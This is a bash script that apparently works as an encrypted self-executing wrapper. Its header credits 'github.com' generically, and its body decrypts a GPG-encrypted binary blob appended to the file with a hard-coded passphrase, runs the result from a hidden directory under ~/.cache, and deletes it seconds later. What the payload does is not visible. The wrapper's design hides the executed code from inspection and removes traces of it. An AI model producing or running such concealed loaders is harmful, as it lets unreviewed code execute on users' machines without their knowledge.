#!/bin/bash
#
# This File Update at Fri 08 Mar 2024 03:06:52 PM WIB
# +--------------------------------------------------+
# | Author  : github.com                             |
# | Zone    : ( Asia )                               |
# | Website : github.com / Admin  @github            |
# +--------------------------------------------------+
# Don't forget follow me on:
# -  https://github.com
# Sponsor this github project:
# -  https://github.com
# -  https://github.com

skip=70
tab='	'
nl='
'
IFS=" $tab$nl"

# Ensure critical variables are present, especially when not defined by login(1)
# Note: $USER may not always be executed (e.g., in containers)
# Copyrighted code by @github / github@gmail.com
USER=${USER:-$(id -u -n)}
# Ensure critical variables are present, especially when not defined by login(1)
# Note: $USER may not always be executed (e.g., in containers)
# Copyrighted code by @github / github@gmail.com
HOME="${HOME:-$(getent passwd $USER 2>/dev/null | cut -d: -f6)}"
# PC does not have getent, but this works even if $HOME is unset
HOME="${HOME:-$(eval echo ~$USER)}"
umask=`umask`
umask 77

shctmpdir=
trap 'res=$?
  test -n "$shctmpdir" && rm -fr "$shctmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | */tmp/) test -d "$TMPDIR" && test -w "$TMPDIR" && test -x "$TMPDIR" || TMPDIR=$HOME/.cache/; test -d "$HOME/.cache" && test -w "$HOME/.cache" && test -x "$HOME/.cache" || mkdir "$HOME/.cache";;
  */tmp) TMPDIR=$TMPDIR/; test -d "$TMPDIR" && test -w "$TMPDIR" && test -x "$TMPDIR" || TMPDIR=$HOME/.cache/; test -d "$HOME/.cache" && test -w "$HOME/.cache" && test -x "$HOME/.cache" || mkdir "$HOME/.cache";;
  *:* | *) TMPDIR=$HOME/.cache/; test -d "$HOME/.cache" && test -w "$HOME/.cache" && test -x "$HOME/.cache" || mkdir "$HOME/.cache";;
esac
if type mktemp >/dev/null 2>&1; then
  shctmpdir=`mktemp -d "${TMPDIR}shctmpXXXXXXXXX"`
else
  shctmpdir=${TMPDIR}shctmp$$; mkdir $shctmpdir
fi || { (exit 127); exit 127; }

shctmp=$shctmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$shctmp" && rm -r "$shctmp";;
*/*) shctmp=$shctmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gpg -q --decrypt --batch --passphrase "github project | BK:Bb:fc:pn:83:qW:qW:o2:nk:BL:pJ:fs:KD:t4:T8:XB:mQ:KT:Rh:t3:I0:rr:kO:8U:Xs:6U:oV:LR:L7:PW:Ty:Uo:e3:7f:8Z:Ze:eO:5n:Gy:GA:Fl:e8:OC:3e:18:L5:1S:ni:I2:z7:Xm:T4:W9:Mb:qR:uE:zN:cA:Zf:Xo:Nl:7E:Uu:Dv:6E:o6:XA:OR:MA:9s:1I:Gn:6Y:vS:Av:wm:RC:E3:xo:nR:GM:gp:jP:x0:TQ:8T:k4:pI:Rs:fL:RV:An:40:CC:Ov:3g:cp:1V:4R:d6:Mb:Aj:NG:Je:y9:T9:Jf:sX:Tu:IH:4j:IR:b0:K3:OS:u0:nf:nR:CL:RD:RV:Tp:Jj:52:08:uL:Xk:6J:PD:em:BK:mj:Oq:mn:au:nz:Pe:Nu:oM:7G:qh:wF:vt:2R:9P:62:ab:6p:Vb:3A:M5:82:YX:7U:Na:vT:nP:2n:3x:8O:dU:td:fU:yR:kg:3y:Kc:Eb:hv:sj:gQ:Jy:C9:1T:mq:gT:Ti:OE:iZ:Q8:lP:Mf:z3:Q0:6u:wr:Dn:ha:PY:Df:FZ:II:CO:XO:8g:pY:gx:4l:Zw:Gw:oP:VV:Sn:RZ:Uh:yp:wi:uL:f0:Ff:wO:2c:jx:cw:re:r7:ty:1n:Pj:gJ:J5:fq:18:TL:FF:x8:gv:Aa:BX:hh:Kf:u8:yk:9x:5W:1e:Cn:2J:TY:Ay:I8:B8:rG:zu:w0:Sj:bb:Ry:6P:h0:fT:r8:Ki:y5:wO:Pj:01:1i:PM:sQ:Ke:ju:Mi:WG:97:Ay:SP:bp:u1:JN:Xd:7F:ez:w7:12:LU:rD:qZ:mo:Mr:hv:Ir:mC:5V:Kj:m4:nT:U6:Tb:hY:0R:OV:90:PF:Iv:lQ:iO:fz:58:CX:so:k7:OO:yU:bz:WR:J4:st:Nv:gA:CM:Io:Vl:MN:UA:wt:OZ:Ax:BV:eo:X1:de:Dk:sK:Me:JY:Sq:1B:1U:gl:7U:nt:YR:OL:kP:Yn:6C:sn:vJ:Db:qQ:v5:5X:zV:UO:ed:oR:B9:Sv:Bh:mh:vu:9r:ia:6l:O3:wD:Da:nG:9d:qI:QT:zD:R8:jV:mL:7W:Ak:TO:Iy:mT:DA:vp:RW:ha:Ih:iR:fJ:Vt:Mm:Pc:A4:dw:nd:0d:ex:oN:wQ:P5:IN:1I:fH:O4:Tv:JB:lB:E1:O0:4Q:fw:bC:3B:iv:7v:GV:vQ:zk:4T:X8:dj:Om:Za:5Q:y3:Rl:Zj:Sy:Ge:22:vI:bk:pN:ue:Ke:hQ:Zy:no:9d:rk:4M:cz:Ga:5e:MZ:DQ:vT:cM:0j:S1:Ub:9q:5F:ku:2m:DA:Nb:XJ:sR:q5:dM:uP:6Y:D4:lB:x2:1W:Io:FW:U4:M0:xt:QD:2p:sx:8u:lG:IP:gl:ic:vl:q5:Oo:ZV:0I:O1:Np:Ld:BO:wS:fK:04:80:6v:2j:59:6h:nR:A0:W0:a4:2F:Vi:na:s1:I7:Jo:gy | github | BK:Bb:fc:pn:83:qW:qW:o2:nk:BL:pJ:fs:KD:t4:T8:XB:mQ:KT:Rh:t3:I0:rr:kO:8U:Xs:6U:oV:LR:L7:PW:Ty:Uo:e3:7f:8Z:Ze:eO:5n:Gy:GA:Fl:e8:OC:3e:18:L5:1S:ni:I2:z7:Xm:T4:W9:Mb:qR:uE:zN:cA:Zf:Xo:Nl:7E:Uu:Dv:6E:o6:XA:OR:MA:9s:1I:Gn:6Y:vS:Av:wm:RC:E3:xo:nR:GM:gp:jP:x0:TQ:8T:k4:pI:Rs:fL:RV:An:40:CC:Ov:3g:cp:1V:4R:d6:Mb:Aj:NG:Je:y9:T9:Jf:sX:Tu:IH:4j:IR:b0:K3:OS:u0:nf:nR:CL:RD:RV:Tp:Jj:52:08:uL:Xk:6J:PD:em:BK:mj:Oq:mn:au:nz:Pe:Nu:oM:7G:qh:wF:vt:2R:9P:62:ab:6p:Vb:3A:M5:82:YX:7U:Na:vT:nP:2n:3x:8O:dU:td:fU:yR:kg:3y:Kc:Eb:hv:sj:gQ:Jy:C9:1T:mq:gT:Ti:OE:iZ:Q8:lP:Mf:z3:Q0:6u:wr:Dn:ha:PY:Df:FZ:II:CO:XO:8g:pY:gx:4l:Zw:Gw:oP:VV:Sn:RZ:Uh:yp:wi:uL:f0:Ff:wO:2c:jx:cw:re:r7:ty:1n:Pj:gJ:J5:fq:18:TL:FF:x8:gv:Aa:BX:hh:Kf:u8:yk:9x:5W:1e:Cn:2J:TY:Ay:I8:B8:rG:zu:w0:Sj:bb:Ry:6P:h0:fT:r8:Ki:y5:wO:Pj:01:1i:PM:sQ:Ke:ju:Mi:WG:97:Ay:SP:bp:u1:JN:Xd:7F:ez:w7:12:LU:rD:qZ:mo:Mr:hv:Ir:mC:5V:Kj:m4:nT:U6:Tb:hY:0R:OV:90:PF:Iv:lQ:iO:fz:58:CX:so:k7:OO:yU:bz:WR:J4:st:Nv:gA:CM:Io:Vl:MN:UA:wt:OZ:Ax:BV:eo:X1:de:Dk:sK:Me:JY:Sq:1B:1U:gl:7U:nt:YR:OL:kP:Yn:6C:sn:vJ:Db:qQ:v5:5X:zV:UO:ed:oR:B9:Sv:Bh:mh:vu:9r:ia:6l:O3:wD:Da:nG:9d:qI:QT:zD:R8:jV:mL:7W:Ak:TO:Iy:mT:DA:vp:RW:ha:Ih:iR:fJ:Vt:Mm:Pc:A4:dw:nd:0d:ex:oN:wQ:P5:IN:1I:fH:O4:Tv:JB:lB:E1:O0:4Q:fw:bC:3B:iv:7v:GV:vQ:zk:4T:X8:dj:Om:Za:5Q:y3:Rl:Zj:Sy:Ge:22:vI:bk:pN:ue:Ke:hQ:Zy:no:9d:rk:4M:cz:Ga:5e:MZ:DQ:vT:cM:0j:S1:Ub:9q:5F:ku:2m:DA:Nb:XJ:sR:q5:dM:uP:6Y:D4:lB:x2:1W:Io:FW:U4:M0:xt:QD:2p:sx:8u:lG:IP:gl:ic:vl:q5:Oo:ZV:0I:O1:Np:Ld:BO:wS:fK:04:80:6v:2j:59:6h:nR:A0:W0:a4:2F:Vi:na:s1:I7:Jo:gy | github" > "$shctmp"; then  umask $umask
  chmod 700 "$shctmp"
  (sleep 5; rm -fr "$shctmpdir") 2>/dev/null &
  "$shctmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n%s\n' "Cannot decompress ${0##*/}" "Report bugs to <github@gmail.com>."
  (exit 127); res=127
fi; exit $res
�	�
|�l`�������bA�2"�L�ǎz��U~�&?����#�8���Ah�����ƳU���f]LD�h��Z�{%�@w�AmJm�}�N�0Y��`1T?�>�~�k��e�3�RR�l"1.�Ñ�tt���1�s���*��6C! ���T�5p�{	j�4P��t�f#v]1��>��6�#�,2��#�D���<�B��S���s��t�k��C�6��)f��[q$��i��++���c
�Qe��ߢ
�f���?�t�-��OV�I����g�OJ��^e�ι3�`��9^,����[�z��=w�4����F*��Sɴ�!й�F�,p�b��ͥ��"����������Ǎ�^��V�%[��I��r֏$������@�?8���SEp�p^3�F�]�p҄i������!���p����,^"�J˨uֈ�q�ud�Vр����X�ͻCF"��AG|ί_���`��-)�cۇh3�r�ߖ�h��X��=OM�~~�v����F���sǒa�%d�	��9/�ZXwU������9�n��X}m���L��=j�>�6	3F=ً������E���4 =��ou�3��
ǚ�.ln�Z�Uʛ
ՅD�t-�;i��D5�*�t"(ŹX%�>M:����t��nuͮ����F�m l?D�wI�a5�f�p���ځ�7m/o�@�X��O�^G��1щ�!{�o"A=� %���2t�T��w��䭀~�W���;��ƙ��I�\�̀ĹK37y��b򱧗yy2$�����Q��>!
����/�8I��sm[L$V	j��m7�/�pK�5�`��	����H�v~z^�=�;^���Ӣ}�\�ak�xJ�L�`EW����[���yy�Fl2�%���>����ĥ�<��yH�Gª��`��Յ,�����k��|˃��l��ŹvK���Hи����^�j&a�.���=~# �QUY���6�R��C�@���˦iբ�\R'm�q)1�� ������ύb�]��3c}�}_��č�+�%*�<# �����#��Qmr0	�w�X�5Bf%�����X�|�f�/�+�%w�>�~�fޡ���5�$��d��XҖh#��h <����[);�f�ކ~�ee��X&t=��Dz�i�I_�y׻�~�,��y��9�r�x\�^$��N����]Z�8ux�0N��I;.��'TBDP5�E"����0�����'��:�����5|(*�X�e��aϱ�������R���MmO�;�:H!�S?Q���Iג�w�s�QY�.��߄�����ϼ��ZU�Om<��r<�o�����*<�`}fYXP{��Yq���F���}^��=/9��uf�[�@��Z��'���z�$*1\��ҩI��6�S��j�NLhĜL6�J����y��sca���4�kN�uLc-�:�)�� �m���R[��U�_܋V_poW_��o��+b�[(v�K@���s �r|�f�5dmq\Y��
����gS�z�=��+������.��X Z4UJw�Ư�yձ��o����{�K�wt��2�Ln��/�{�!Z,=NOo�0bx
-2c�YqFS8b��V�<O�#1���"(�k�Җ�����u�f��Ð:ʺZ?���V��'�